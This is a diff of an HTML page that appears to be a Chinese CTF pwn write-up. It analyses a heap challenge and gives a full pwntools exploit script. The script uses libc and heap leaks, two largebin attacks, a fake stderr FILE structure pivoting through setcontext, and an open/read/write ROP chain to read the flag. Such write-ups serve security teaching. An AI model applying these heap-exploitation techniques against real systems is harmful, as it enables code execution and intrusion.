@@ -59,8 +59,6 @@
     <div class="date">2023 July 27th</div>
     <div class="tags">
       
-      <div class="tag-item">CTF</div>
-      
       <div class="tag-item">PWN</div>
       
       <div class="tag-item">wp</div>
@@ -72,8 +70,9 @@
   <main class="post-content"><blockquote>
 <p>最后一天的题，水水</p>
 </blockquote>
-<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWBQWXFadmin</span><br><span class="line">CAT | r00t QWBQWXF$\xff</span><br></pre></td></tr></table></figure>
-
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="格式检查"><a href="#格式检查" class="headerlink" title="格式检查"></a>格式检查</h3><pre><code class="shell">LOGIN | r00t QWBQWXFadmin
+CAT | r00t QWBQWXF$\xff
+</code></pre>
 <h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>index在0到15间</p>
 <p>0x418&lt;&#x3D; size &lt;&#x3D;0x46f</p>
 <p>使用calloc</p>
@@ -99,10 +98,161 @@
 <h2 id="IO利用流程分析"><a href="#IO利用流程分析" class="headerlink" title="IO利用流程分析"></a>IO利用流程分析</h2><p>_wide_data&#x3D;fake_io_addr+0x30</p>
 <p>1.将[rdi+0xa0]<code>_wide_data</code>处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。<br>2.将新赋值的[rax1+0x20]<code>_IO_backup_base</code>处的内容赋值给rdx。<br>3.将[rax1+0xe0]</p>
 <p>处的内容赋值给rax，称之为<strong>rax2</strong>。<br>4.call调用[rax2+0x18]处的内容。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址</span><br></pre></td></tr></table></figure>
+<pre><code class="c">_wide_data-&gt;_IO_read_ptr ！=_wide_data-&gt;_IO_read_end
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base
+#如果_wide_data=fake_io_addr+0x30，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base
+fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址
+</code></pre>
+<pre><code class="python">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import*
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">login = <span class="string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">cat = <span class="string">&quot;CAT | r00t QWB QWXF$\xff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">	p.sendafter(<span class="string">&quot;mew~~~~~~\n&quot;</span>, cat)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;cat\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">	p.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.send(login)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, cyclic(<span class="number">0x420</span>))<span class="comment">#largechunk 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x440</span>, cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x450</span>, cyclic(<span class="number">0x450</span>))</span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak largechunk</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">stderr_addr = libc_base + <span class="number">0x21a860</span></span><br><span class="line">setcontext61 = libc_base + <span class="number">0x53a6d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x7f\x00\x00&quot;</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&quot;heap0_base = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">log.success(<span class="string">&quot;stderr_addr = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stderr_addr)))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000029cd6</span>+libc_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line">syscall = <span class="number">0x0000000000091396</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#fake stderr----------------------------------------</span></span><br><span class="line">fake_stderr = heap_base + <span class="number">0xf70</span></span><br><span class="line">fake_rdx = fake_stderr + <span class="number">0x10</span> + <span class="number">0x200</span></span><br><span class="line">fake_stack = fake_stderr + <span class="number">0x10</span> + <span class="number">0x320</span></span><br><span class="line">io = p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(<span class="number">1</span>) + p64(<span class="number">2</span>)<span class="comment">#rcx!=0</span></span><br><span class="line">io += p64(fake_rdx)<span class="comment">#backup_base rdx</span></span><br><span class="line">io += p64(setcontext61)</span><br><span class="line">io = io.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+<span class="number">0x21ba60</span>)<span class="comment">#lock</span></span><br><span class="line">io = io.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(fake_stderr+<span class="number">0x30</span>)<span class="comment">#wide_data rax1</span></span><br><span class="line">io = io.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(<span class="number">1</span>)<span class="comment">#mode</span></span><br><span class="line">io = io.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io += p64(fake_stderr+<span class="number">0x40</span>)</span><br><span class="line">io = io.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#fake rdx:</span></span><br><span class="line">payload = <span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi-&gt;0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)<span class="comment">#rdx-&gt;0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>)</span><br><span class="line">payload += p64(fake_stack)<span class="comment">#rsp-&gt;chunk 1</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx-&gt;ret</span></span><br><span class="line">io += payload</span><br><span class="line">io = io.ljust(<span class="number">0x320</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment">#fake_stack:</span></span><br><span class="line">payload = p64(libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(fake_rdx)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">io+=payload</span><br><span class="line"></span><br><span class="line">io = io.ljust(<span class="number">0x430</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x440</span>,io)<span class="comment"># largebin 0 </span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x430</span>,cyclic(<span class="number">0x430</span>))<span class="comment">#largebin 1</span></span><br><span class="line"><span class="comment"># add(7,0x440,cyclic(0x440))</span></span><br><span class="line"><span class="comment"># add(8,0x420,cyclic(0x420))</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x440</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(stderr_addr-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x430</span>, cyclic(<span class="number">0x430</span>))<span class="comment">#calloc chunk6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin attack 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#largebin 1 0x430</span></span><br><span class="line"><span class="comment">#delete(8)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0xf90</span>) + p64(heap_base+<span class="number">0x2538</span>-<span class="number">5</span>-<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x41f</span>,cyclic(<span class="number">0x41f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x460</span>,cyclic(<span class="number">0x460</span>))<span class="comment">#trigger malloc assert</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
 
+host = &quot;&quot;
+port = 0
+p = process(&quot;./pwn&quot;)
+#p = remote(host, port)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+login = &quot;LOGIN | r00t QWB QWXFadmin&quot;
+cat = &quot;CAT | r00t QWB QWXF$\xff&quot;
+
+def add(index, size, content):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;1&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+    p.sendlineafter(&quot;size:\n&quot;,str(size).encode())
+    p.sendafter(&quot;content:\n&quot;,content)
+def delete(index):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;2&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+def show(index):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;3&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+def edit(index, content):
+    p.sendafter(&quot;mew~~~~~~\n&quot;, cat)
+    p.sendlineafter(&quot;cat\n&quot;, &quot;4&quot;)
+    p.sendlineafter(&quot;idx:\n&quot;,str(index).encode())
+    p.sendafter(&quot;content:\n&quot;,content)
+
+p.send(login)
+add(0, 0x420, cyclic(0x420))#largechunk 0
+add(1, 0x440, cyclic(0x440))
+delete(0)
+add(2, 0x450, cyclic(0x450))
+show(0)#leak largechunk
+
+libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x21a0d0
+stderr_addr = libc_base + 0x21a860
+setcontext61 = libc_base + 0x53a6d
+p.recvuntil(&quot;\x7f\x00\x00&quot;)
+heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x290
+log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+log.success(&quot;stderr_addr = &#123;&#125;&quot;.format(hex(stderr_addr)))
+
+ret = 0x0000000000029cd6+libc_base
+pop_rdi = 0x000000000002a3e5+libc_base
+pop_rsi = 0x000000000002be51+libc_base
+pop_rax = 0x0000000000045eb0 + libc_base
+syscall = 0x0000000000091396 + libc_base
+
+# debug()
+#fake stderr----------------------------------------
+fake_stderr = heap_base + 0xf70
+fake_rdx = fake_stderr + 0x10 + 0x200
+fake_stack = fake_stderr + 0x10 + 0x320
+io = p64(0)*6
+io += p64(1) + p64(2)#rcx!=0
+io += p64(fake_rdx)#backup_base rdx
+io += p64(setcontext61)
+io = io.ljust(0x78, &#39;\x00&#39;)
+io += p64(libc_base+0x21ba60)#lock
+io = io.ljust(0x90, &#39;\x00&#39;)
+io += p64(fake_stderr+0x30)#wide_data rax1
+io = io.ljust(0xb0, &#39;\x00&#39;)
+io += p64(1)#mode
+io = io.ljust(0xc8, &#39;\x00&#39;)
+io += p64(libc_base+libc.sym[&#39;_IO_wfile_jumps&#39;]+0x10)
+io += p64(0)*6
+io += p64(fake_stderr+0x40)
+io = io.ljust(0x200, &#39;\x00&#39;)
+#fake rdx:
+payload = &quot;./flag\x00\x00&quot;
+payload = payload.ljust(0x68,&quot;\x00&quot;)
+payload += p64(0)#rdi-&gt;0
+payload += p64(0)#rsi-&gt;0
+payload = payload.ljust(0x88,&quot;\x00&quot;)
+payload += p64(0x100)#rdx-&gt;0
+payload = payload.ljust(0xa0)
+payload += p64(fake_stack)#rsp-&gt;chunk 1
+payload += p64(ret)#rcx-&gt;ret
+io += payload
+io = io.ljust(0x320,&quot;\x00&quot;)
+#fake_stack:
+payload = p64(libc_base+libc.sym[&#39;close&#39;])
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(fake_rdx)
+payload += p64(pop_rax)
+payload += p64(2)
+payload += p64(syscall)#open
+payload += p64(pop_rax)
+payload += p64(0)
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x100)
+payload += p64(syscall)#read
+payload += p64(pop_rax)
+payload += p64(1)
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x100)
+payload += p64(syscall)#write
+io+=payload
+
+io = io.ljust(0x430,&#39;\x00&#39;)
+
+#----------------------------------------------
+
+add(4,0x440,io)# largebin 0 
+add(5,0x440,cyclic(0x440))
+add(6,0x430,cyclic(0x430))#largebin 1
+# add(7,0x440,cyclic(0x440))
+# add(8,0x420,cyclic(0x420))
+delete(4)
+add(9,0x460,cyclic(0x440))
+delete(6)
+#largebin attack
+payload = p64(libc_base+0x21a0e0)*2 + p64(heap_base+0xf90) + p64(stderr_addr-0x20) + p64(0)*2
+edit(4, payload)
+add(10,0x460,cyclic(0x460))
+
+add(11, 0x430, cyclic(0x430))#calloc chunk6
+
+#largebin attack 2
+
+delete(11)#largebin 1 0x430
+#delete(8)
+payload = p64(libc_base+0x21a0e0)*2 + p64(heap_base+0xf90) + p64(heap_base+0x2538-5-0x20) + p64(0)*2
+edit(4, payload)
+add(15,0x41f,cyclic(0x41f))
+
+
+# debug()
+add(7, 0x460,cyclic(0x460))#trigger malloc assert
+
+p.interactive()
+</code></pre>
 </main>
 
 </article>
